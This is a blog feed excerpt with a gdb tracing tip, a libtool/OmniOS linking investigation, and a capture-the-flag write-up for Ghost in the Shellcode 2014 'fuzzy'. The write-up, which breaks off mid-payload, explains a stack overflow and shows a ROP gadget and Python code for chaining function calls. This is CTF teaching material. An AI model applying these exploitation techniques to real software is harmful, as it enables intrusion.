&lt;li&gt;&lt;code&gt;gdb&lt;/code&gt; can directly access the values of register and then cast them to common C types (in this case, &lt;code&gt;$rdi&lt;/code&gt; is the first argument, which we know is a &lt;code&gt;char *&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Putting it all together&lt;/h2&gt;
&lt;p&gt;We can use these tricks together to get ad-hoc dynamic tracing of our server!&lt;/p&gt;
&lt;p&gt;This logs the filename and the stack trace from any open call that isn't to our log directory, but otherwise runs the server as normal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;(gdb) break open if !strstr(&lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;rdi&lt;/span&gt;&lt;span class="x"&gt;, &amp;quot;/var/log&amp;quot;)&lt;/span&gt;
&lt;span class="x"&gt;(gdb) commands&lt;/span&gt;
&lt;span class="x"&gt;End with a line saying just &amp;quot;end&amp;quot;.&lt;/span&gt;
&lt;span class="x"&gt;&amp;gt;print/s &lt;/span&gt;&lt;span class="p"&gt;$&lt;/span&gt;&lt;span class="nv"&gt;rdi&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;&amp;gt;backtrace&lt;/span&gt;
&lt;span class="x"&gt;&amp;gt;continue&lt;/span&gt;
&lt;span class="x"&gt;&amp;gt;end&lt;/span&gt;
&lt;span class="x"&gt;(gdb) continue&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="gdb"></category><category term="conditional breakpoint"></category><category term="breakpoint commands"></category></entry><entry><title>Compiling with libtool on OmniOS</title><link href="https://codearcana.com/posts/2014/04/30/compiling-with-libtool-on-omnios.html" rel="alternate"></link><published>2014-04-30T00:00:00-07:00</published><updated>2014-04-30T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2014-04-30:/posts/2014/04/30/compiling-with-libtool-on-omnios.html</id><summary type="html">&lt;p&gt;I'm having issues compiling glib2.40.0 (a libtool compiled shared library) on Omnios.&lt;/p&gt;
&lt;p&gt;In particular, my shared library has a static initializer that does not get executed by the libtool linked library. I've reduced this to the test case below:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;__attribute__&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="n"&gt;myctor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;in …&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;I'm having issues compiling glib2.40.0 (a libtool compiled shared library) on Omnios.&lt;/p&gt;
&lt;p&gt;In particular, my shared library has a static initializer that does not get executed by the libtool linked library. I've reduced this to the test case below:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;__attribute__&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="n"&gt;myctor&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;in myctor&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I can compile with libtool and link with gcc, and get the expected behavior on LD_PRELOAD:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; libtool --mode&lt;span class="o"&gt;=&lt;/span&gt;compile gcc -c myctor.c
&lt;span class="go"&gt;libtool: compile:  gcc -c myctor.c  -fPIC -DPIC -o .libs/myctor.o&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; gcc -shared .libs/myctor.o -o libmyctor.so
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;/libmyctor.so ls
&lt;span class="go"&gt;in myctor&lt;/span&gt;
&lt;span class="go"&gt;libmyctor.so  myctor.c      myctor.lo&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If I link with libtool, I do not get the expected behavior:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; libtool --mode&lt;span class="o"&gt;=&lt;/span&gt;link gcc -o libmyctor.la  -rpath /usr/lib myctor.lo
&lt;span class="go"&gt;libtool: link: gcc -shared  -fPIC -DPIC -Wl,-z -Wl,text -Wl,-h -Wl,libmyctor.so.0 -o .libs/libmyctor.so.0.0.0  .libs/myctor.o      -nostdlib -lc&lt;/span&gt;
&lt;span class="go"&gt;libtool: link: (cd &amp;quot;.libs&amp;quot; &amp;amp;&amp;amp; rm -f &amp;quot;libmyctor.so.0&amp;quot; &amp;amp;&amp;amp; ln -s &amp;quot;libmyctor.so.0.0.0&amp;quot; &amp;quot;libmyctor.so.0&amp;quot;)&lt;/span&gt;
&lt;span class="go"&gt;libtool: link: (cd &amp;quot;.libs&amp;quot; &amp;amp;&amp;amp; rm -f &amp;quot;libmyctor.so&amp;quot; &amp;amp;&amp;amp; ln -s &amp;quot;libmyctor.so.0.0.0&amp;quot; &amp;quot;libmyctor.so&amp;quot;)&lt;/span&gt;
&lt;span class="go"&gt;libtool: link: ( cd &amp;quot;.libs&amp;quot; &amp;amp;&amp;amp; rm -f &amp;quot;libmyctor.la&amp;quot; &amp;amp;&amp;amp; ln -s &amp;quot;../libmyctor.la&amp;quot; &amp;quot;libmyctor.la&amp;quot; )&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;/.libs/libmyctor.so.0.0.0 ls
&lt;span class="go"&gt;libmyctor.la  libmyctor.so  myctor.c      myctor.lo&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I performed some trial and error experiments with the displayed gcc command invocation, and determined that "-nostdlib" is the flag that causes the constructor to no longer be called:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gcc -shared  -fPIC -DPIC -Wl,-z -Wl,text -Wl,-h -Wl,libmyctor.so.0 -o .libs/libmyctor.so.0.0.0  .libs/myctor.o
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;/.libs/libmyctor.so.0.0.0 ls
&lt;span class="go"&gt;in myctor&lt;/span&gt;
&lt;span class="go"&gt;libmyctor.la  libmyctor.so  myctor.c      myctor.lo&lt;/span&gt;

&lt;span class="gp"&gt;$&lt;/span&gt; gcc -shared  -fPIC -DPIC -Wl,-z -Wl,text -Wl,-h -Wl,libmyctor.so.0 -o .libs/libmyctor.so.0.0.0  .libs/myctor.o      -nostdlib -lc
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;/.libs/libmyctor.so.0.0.0
&lt;span class="go"&gt;libmyctor.la  libmyctor.so  myctor.c      myctor.lo&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Illumos / Solaris has its own peculiarities for static initializers (&lt;a href="https://blogs.oracle.com/ahl/entry/the_mysteries_of_init"&gt;https://blogs.oracle.com/ahl/entry/the_mysteries_of_init&lt;/a&gt; was a helpful blogpost). The ".init" section for the gcc linked library has the expected contents:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; dis -t .init libmyctor.so
&lt;span class="go"&gt;disassembly for libmyctor.so&lt;/span&gt;


&lt;span class="go"&gt;section .init&lt;/span&gt;
&lt;span class="go"&gt;_init()&lt;/span&gt;
&lt;span class="go"&gt;    _init:      55                 pushl  %ebp&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x1:  89 e5              movl   %esp,%ebp&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x3:  83 e4 f0           andl   $0xfffffff0,%esp&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x6:  83 ec 0c           subl   $0xc,%esp&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x9:  53                 pushl  %ebx&lt;/span&gt;
&lt;span class="go"&gt;    _init+0xa:  e8 00 00 00 00     call   +0x0  &amp;lt;_init+0xf&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;    _init+0xf:  5b                 popl   %ebx&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x10: 81 c3 49 00 01 00  addl   $0x10049,%ebx&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x16: e8 35 ff ff ff     call   -0xcb &amp;lt;frame_dummy&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x1b: e8 a0 ff ff ff     call   -0x60 &amp;lt;__do_global_ctors_aux&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x20: 5b                 popl   %ebx&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x21: c9                 leave  &lt;/span&gt;
&lt;span class="go"&gt;    _init+0x22: c3                 ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But the ".init" section for the libtool linked library doesn't exist&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; dis -t .init .libs/libmyctor.so
&lt;span class="go"&gt;disassembly for .libs/libmyctor.so&lt;/span&gt;

&lt;span class="go"&gt;dis: warning: failed to find section &amp;#39;.init&amp;#39; in &amp;#39;.libs/libmyctor.so&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Digging a bit deeper (and reading that blog post), I see that I need to add &lt;code&gt;/usr/lib/crti.o&lt;/code&gt; and &lt;code&gt;/usr/lib/crtn.o&lt;/code&gt;. If I add these to the command line, I get an ".init" section that seems to be only partially complete:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;section .init&lt;/span&gt;
&lt;span class="go"&gt;_init()&lt;/span&gt;
&lt;span class="go"&gt;    _init:      55                 pushl  %ebp&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x1:  89 e5              movl   %esp,%ebp&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x3:  83 e4 f0           andl   $0xfffffff0,%esp&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x6:  83 ec 0c           subl   $0xc,%esp&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x9:  53                 pushl  %ebx&lt;/span&gt;
&lt;span class="go"&gt;    _init+0xa:  e8 00 00 00 00     call   +0x0  &amp;lt;_init+0xf&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;    _init+0xf:  5b                 popl   %ebx&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x10: 81 c3 31 00 01 00  addl   $0x10031,%ebx&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x16: 5b                 popl   %ebx&lt;/span&gt;
&lt;span class="go"&gt;    _init+0x17: c9                 leave  &lt;/span&gt;
&lt;span class="go"&gt;    _init+0x18: c3                 ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The problem is that we also need to pass some gcc artifacts (&lt;code&gt;/opt/gcc-4.8.1/lib/gcc/i386-pc-solaris2.11/4.8.1/crt{begin,end}.o&lt;/code&gt;) to get this to work. If I add all the relevant artifacts, I can get the constructor to behave correctly with &lt;code&gt;-nostdlib&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gcc -shared -nostdlib -lc -lgcc -lgcc_s /usr/lib/crti.o  /opt/gcc-4.8.1/lib/gcc/i386-pc-solaris2.11/4.8.1/crtbegin.o .libs/myctor.o /opt/gcc-4.8.1/lib/gcc/i386-pc-solaris2.11/4.8.1/crtend.o /usr/lib/crtn.o -o libmyctor.so
&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;/libmyctor.so ls
&lt;span class="go"&gt;in myctor&lt;/span&gt;
&lt;span class="go"&gt;libmyctor.so  myctor.c      myctor.lo&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Fortunately, this all turns out to be unnecessary - a good spot by Rich Lowe turned up some voodoo in the omnios build infrastructure: the &lt;code&gt;-nostdlib&lt;/code&gt; was inexplicably added to the libtool options &lt;a href="https://github.com/omniti-labs/omnios-build/commit/16fdea8b57a52d74876606d6b118b50753603395"&gt;"glib2 -nostdlib"&lt;/a&gt; (For more fun, check out &lt;a href="https://github.com/omniti-labs/omnios-build/commit/18800320ec1119aab568efc72f50c3689e30c687"&gt;"generic libtool unfucking support"&lt;/a&gt;). Removing this allows us to compile our library with the expected behavior.&lt;/p&gt;</content><category term="libtool"></category><category term="omnios"></category></entry><entry><title>Ghost in the Shellcode 2014 - fuzzy</title><link href="https://codearcana.com/posts/2014/01/19/ghost-in-the-shellcode-2014-fuzzy.html" rel="alternate"></link><published>2014-01-19T00:00:00-08:00</published><updated>2014-01-19T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2014-01-19:/posts/2014/01/19/ghost-in-the-shellcode-2014-fuzzy.html</id><summary type="html">&lt;p&gt;tl;dr - &lt;code&gt;fuzzy&lt;/code&gt; is a "super secure parsing engine", that includes a histogram function. The histogram ascii text uses a buffer on the stack, but will increment
buckets past the end of the buffer if non ascii text is provided, allowing us to
rop. Binary and exploit available &lt;a
href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/fuzzy.tar.gz"&gt;here&lt;/a&gt;.
Cross …&lt;/p&gt;</summary><content type="html">&lt;p&gt;tl;dr - &lt;code&gt;fuzzy&lt;/code&gt; is a "super secure parsing engine", that includes a histogram function. The histogram ascii text uses a buffer on the stack, but will increment
buckets past the end of the buffer if non ascii text is provided, allowing us to
rop. Binary and exploit available &lt;a
href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2014/01/fuzzy.tar.gz"&gt;here&lt;/a&gt;.
Cross post from &lt;a href="http://ppp.cylab.cmu.edu/wordpress/?p=1146"&gt;PPP
blog&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;The program&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;fuzzy&lt;/code&gt; is a "super secure parsing engine", that includes a histogram function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nc fuzzy.2014.ghostintheshellcode.com 4141
&lt;span class="go"&gt;Welcome to the super secure parsing engine!&lt;/span&gt;
&lt;span class="go"&gt;Please select a parser!&lt;/span&gt;

&lt;span class="go"&gt;1) Sentence histogram&lt;/span&gt;
&lt;span class="go"&gt;2) Sorted characters (ascending)&lt;/span&gt;
&lt;span class="go"&gt;3) Sorted characters (decending)&lt;/span&gt;
&lt;span class="go"&gt;4) Sorted ints (ascending)&lt;/span&gt;
&lt;span class="go"&gt;5) Sorted ints (decending&lt;/span&gt;
&lt;span class="go"&gt;6) global_find numbers in string&lt;/span&gt;
&lt;span class="go"&gt;1&lt;/span&gt;
&lt;span class="go"&gt;Enter a series of characters&lt;/span&gt;
&lt;span class="go"&gt;hello&lt;/span&gt;
&lt;span class="go"&gt; :0 !:0 &amp;quot;:0 #:0 $:0 &lt;/span&gt;
&lt;span class="gp"&gt;%&lt;/span&gt;:0 &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;:0 &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;:0 &lt;span class="o"&gt;(&lt;/span&gt;:0 &lt;span class="o"&gt;)&lt;/span&gt;:0 
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;a:0 b:0 c:0 d:0 e:1 &lt;/span&gt;
&lt;span class="go"&gt;f:0 g:0 h:1 i:0 j:0 &lt;/span&gt;
&lt;span class="go"&gt;k:0 l:2 m:0 n:0 o:1 &lt;/span&gt;
&lt;span class="go"&gt;p:0 q:0 r:0 s:0 t:0 &lt;/span&gt;
&lt;span class="go"&gt;u:0 v:0 w:0 x:0 y:0 &lt;/span&gt;
&lt;span class="go"&gt;z:0 {:0 |:0 }:0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As you can see, it computes a histogram of the input. This histogram
is constructed using a buffer that is on the stack, so if we send it
non-ascii text we can write to the stack. By modifying the saved &lt;code&gt;ebp&lt;/code&gt;,
we can point the stack to a buffer we control. &lt;/p&gt;
&lt;p&gt;Unfortunately, this is a bit challenging to figure out because all 
the interesting functions are encrypted. Fortunately for us, the "encryption"
is just bitwise not. Using our favorite hex editor, we make a new binary with 
the decrypted functions to reverse.&lt;/p&gt;
&lt;p&gt;With control of the stack, we get control over rip and can ROP.
We will use the &lt;code&gt;callFunction&lt;/code&gt; function, which decrypts a function
into an executable page and then runs it. Our goal will be to &lt;code&gt;read&lt;/code&gt; encrypted shellcode
into a known location (there is a convenient buffer &lt;code&gt;dontcollide&lt;/code&gt; in the data
section that is never used), then invoke &lt;code&gt;callFunction&lt;/code&gt; to run our shellcode. 
Unfortunately, since this is x64, we need to find a good gadget to be able to
control registers and call functions. Luckily, there is a good gadget in 
&lt;code&gt;__libc_csu_init&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;loc_401790:&lt;/span&gt;                             &lt;span class="c1"&gt;; CODE XREF: __libc_csu_init+64j&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r13&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;r14&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;r15d&lt;/span&gt;
                &lt;span class="nf"&gt;call&lt;/span&gt;    &lt;span class="kt"&gt;qword&lt;/span&gt; &lt;span class="nv"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;add&lt;/span&gt;     &lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
                &lt;span class="nf"&gt;cmp&lt;/span&gt;     &lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;rbp&lt;/span&gt;
                &lt;span class="nf"&gt;jnz&lt;/span&gt;     &lt;span class="nv"&gt;short&lt;/span&gt; &lt;span class="nv"&gt;loc_401790&lt;/span&gt;

&lt;span class="nl"&gt;loc_4017A6:&lt;/span&gt;                             &lt;span class="c1"&gt;; CODE XREF: __libc_csu_init+4Aj&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nb"&gt;rbp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;10h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;18h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;20h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r14&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;28h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;30h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="nf"&gt;add&lt;/span&gt;     &lt;span class="nb"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;38h&lt;/span&gt;
                &lt;span class="nf"&gt;retn&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This gadget allows us to control the first three  registers we need an call 
anything we have function pointer to. The program uses a large function pointer table to enable
the encrypted functions to call library functions, so we have pointers to many
library functions. Unfortunately, we do &lt;em&gt;not&lt;/em&gt; have a pointer to &lt;code&gt;readAll&lt;/code&gt;, so we
cannot use it with our gadget. Furthermore, our gadget only controls 3 arguments,
so we cannot easily use &lt;code&gt;recv&lt;/code&gt;. Lastly, we cannot use the encrypted &lt;code&gt;my_readAll&lt;/code&gt;
function (that we have a pointer to) because it reads its arguments out of a
buffer and we don't have an easy way to call functions with a buffer we control 
as an argument. Still, this gadget allows us to chain calls arbitrary function pointers
with 3 arguments:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Assumes rip points to loc_4017A6.&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;function_ptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arg2&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="c1"&gt;# Make sure rbx is 0 to make math easy, and rbp is 1 so we fall through to&lt;/span&gt;
  &lt;span class="c1"&gt;# loc_4017A6 for repeated calls.&lt;/span&gt;
  &lt;span class="c1"&gt;#      padding            rbx       rbp       r12                  r13=rdx      r14=rsi      r15=edi&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xdeadbeef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;function_ptr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__libc_csu_init_gadget&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Instead, we make a function pointer to &lt;code&gt;readAll&lt;/code&gt; in the data section that we can use our
gadget.
We call &lt;code&gt;memset&lt;/code&gt; 4 times, once for each distinct byte in
the the address of &lt;code&gt;readAll&lt;/code&gt;, and make &lt;code&gt;dontcollide&lt;/code&gt; a pointer to &lt;code&gt;readAll&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Set dontcollide to be a function pointer to readAll (0x4013cb).&lt;/span&gt;
&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;memset_fptr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dontcollide&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
